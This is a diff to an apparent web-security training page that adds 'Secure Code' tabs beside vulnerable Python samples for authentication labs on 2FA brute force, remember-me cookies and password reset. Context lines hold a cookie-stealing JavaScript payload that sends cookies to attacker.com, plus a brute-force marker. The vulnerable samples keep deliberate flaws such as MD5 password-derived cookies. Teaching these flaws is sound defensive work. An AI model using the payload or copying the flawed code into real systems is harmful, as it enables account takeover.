@@ -1735,8 +1735,12 @@ mfa-code=§0000§  # Brute-force 0000-9999
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab9"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab9"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab9-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/login2', methods=['POST'])
@@ -1754,6 +1758,32 @@ def verify_2fa():
         return redirect('/my-account')
 
 <span class="vuln-line">    user.mfa_attempts += 1  # ❌ Resets on re-login!</span>
+    return error('Invalid code')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab9-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
+<span class="secure-line">@rate_limit(max=10, window=300)  # ✅ Rate limit on 2FA</span>
+def verify_2fa():
+    code = request.form.get('mfa-code')
+    user = get_current_user()
+
+<span class="secure-line">    # ✅ Permanent lockout tracked in database</span>
+<span class="secure-line">    if user.mfa_lockout_until and user.mfa_lockout_until > datetime.now():</span>
+<span class="secure-line">        return error('Account locked. Contact support.')</span>
+
+<span class="secure-line">    if user.mfa_attempts >= 5:</span>
+<span class="secure-line">        user.mfa_lockout_until = datetime.now() + timedelta(hours=1)</span>
+<span class="secure-line">        return error('Too many attempts. Locked for 1 hour.')</span>
+
+    if user.mfa_code == code:
+        user.mfa_attempts = 0
+        session['2fa_complete'] = True
+        return redirect('/my-account')
+
+    user.mfa_attempts += 1
     return error('Invalid code')</code></pre>
                         </div>
                     </div>
@@ -1793,8 +1823,11 @@ def verify_2fa():
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab10"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab10"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab10-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">def create_remember_cookie(user):
@@ -1810,6 +1843,40 @@ def verify_remember_cookie(cookie):
 <span class="vuln-line">    # ❌ Compares MD5 hash - brute-forceable!</span>
 <span class="vuln-line">    if hashlib.md5(user.password.encode()).hexdigest() == password_hash:</span>
         return user
+    return None</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab10-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import secrets
+import hmac
+import hashlib
+
+def create_remember_cookie(user):
+<span class="secure-line">    # ✅ Generate cryptographically secure random token</span>
+<span class="secure-line">    token = secrets.token_urlsafe(32)</span>
+<span class="secure-line">    # ✅ Store token hash in database, not password-derived value</span>
+<span class="secure-line">    user.remember_token = hashlib.sha256(token.encode()).hexdigest()</span>
+<span class="secure-line">    user.token_expiry = datetime.utcnow() + timedelta(days=30)</span>
+    db.session.commit()
+<span class="secure-line">    return f"{user.id}:{token}"  # ✅ No password material in cookie</span>
+
+def verify_remember_cookie(cookie):
+    try:
+        user_id, token = cookie.split(':')
+        user = User.query.get(int(user_id))
+
+<span class="secure-line">        # ✅ Check token expiry</span>
+<span class="secure-line">        if user.token_expiry < datetime.utcnow():</span>
+<span class="secure-line">            return None</span>
+
+<span class="secure-line">        # ✅ Constant-time comparison prevents timing attacks</span>
+<span class="secure-line">        token_hash = hashlib.sha256(token.encode()).hexdigest()</span>
+<span class="secure-line">        if hmac.compare_digest(user.remember_token, token_hash):</span>
+            return user
+    except:
+        pass
     return None</code></pre>
                         </div>
                     </div>
@@ -1854,8 +1921,11 @@ for pwd in passwords:
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab11"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab11"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab11-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python"># Cookie stored: base64(carlos:26323c16d5f4dabff3bb136f2460a943)
@@ -1864,6 +1934,28 @@ for pwd in passwords:
 
 <span class="vuln-line">response.set_cookie('stay-logged-in', cookie,</span>
 <span class="vuln-line">                    httponly=False)  # ❌ Accessible via JavaScript!</span></code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab11-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import secrets
+
+def create_remember_token():
+<span class="secure-line">    # ✅ Generate secure random token (not derived from password)</span>
+<span class="secure-line">    token = secrets.token_urlsafe(64)</span>
+    return token
+
+<span class="secure-line">response.set_cookie('stay-logged-in', token,</span>
+<span class="secure-line">                    httponly=True,    # ✅ Not accessible via JavaScript</span>
+<span class="secure-line">                    secure=True,      # ✅ HTTPS only</span>
+<span class="secure-line">                    samesite='Strict' # ✅ Prevent CSRF</span>
+<span class="secure-line">                    )</span>
+
+# Token stored in DB with:
+# - User ID association
+# - Expiration timestamp
+# - Bcrypt/Argon2 hash (not MD5!)</code></pre>
                         </div>
                     </div>
                 </div>
@@ -1905,8 +1997,11 @@ document.location='https://attacker.com/steal?c='+document.cookie
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab12"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab12"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab12-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
@@ -1921,6 +2016,35 @@ def reset_password():
 
 <span class="vuln-line">    user = User.query.filter_by(username=username).first()</span>
 <span class="vuln-line">    user.password = hash_password(new_password)  # ❌ Resets wrong user!</span>
+    db.session.commit()</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab12-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
+def reset_password():
+    token = request.form.get('token')
+    new_password = request.form.get('new-password')
+
+<span class="secure-line">    # ✅ Token is tied to specific user in database</span>
+<span class="secure-line">    reset_request = PasswordReset.query.filter_by(token_hash=hash_token(token)).first()</span>
+
+<span class="secure-line">    if not reset_request:</span>
+<span class="secure-line">        return error('Invalid or expired token')</span>
+
+<span class="secure-line">    # ✅ Check token expiry</span>
+<span class="secure-line">    if reset_request.expires_at < datetime.utcnow():</span>
+<span class="secure-line">        db.session.delete(reset_request)</span>
+<span class="secure-line">        db.session.commit()</span>
+<span class="secure-line">        return error('Token has expired')</span>
+
+<span class="secure-line">    # ✅ User is determined by the token, not user input</span>
+<span class="secure-line">    user = reset_request.user  # User from token association</span>
+    user.password = hash_password(new_password)
+
+<span class="secure-line">    # ✅ Invalidate the token after use (one-time use)</span>
+<span class="secure-line">    db.session.delete(reset_request)</span>
     db.session.commit()</code></pre>
                         </div>
                     </div>
@@ -1961,8 +2085,11 @@ new-password=hacked123
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab13"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab13"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab13-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/forgot-password', methods=['POST'])
@@ -1978,6 +2105,35 @@ def forgot_password():
 
     send_email(user.email, f"Reset your password: {reset_url}")
     return success('Password reset email sent')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab13-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># config.py
+<span class="secure-line">ALLOWED_HOSTS = ['myapp.com', 'www.myapp.com']</span>
+<span class="secure-line">BASE_URL = 'https://myapp.com'  # ✅ Hardcoded, not from request</span>
+
+@app.route('/forgot-password', methods=['POST'])
+def forgot_password():
+    username = request.form.get('username')
+    user = User.query.filter_by(username=username).first()
+
+<span class="secure-line">    # ✅ Don't reveal if user exists</span>
+<span class="secure-line">    if not user:</span>
+<span class="secure-line">        return success('If account exists, reset email sent')</span>
+
+    token = generate_reset_token(user)
+
+<span class="secure-line">    # ✅ Use hardcoded base URL from config</span>
+<span class="secure-line">    reset_url = f"{app.config['BASE_URL']}/reset?token={token}"</span>
+
+<span class="secure-line">    # ✅ Validate Host header if using it</span>
+<span class="secure-line">    if request.host not in app.config['ALLOWED_HOSTS']:</span>
+<span class="secure-line">        abort(400, 'Invalid host')</span>
+
+    send_email(user.email, f"Reset your password: {reset_url}")
+<span class="secure-line">    return success('If account exists, reset email sent')  # ✅ Generic message</span></code></pre>
                         </div>
                     </div>
                 </div>
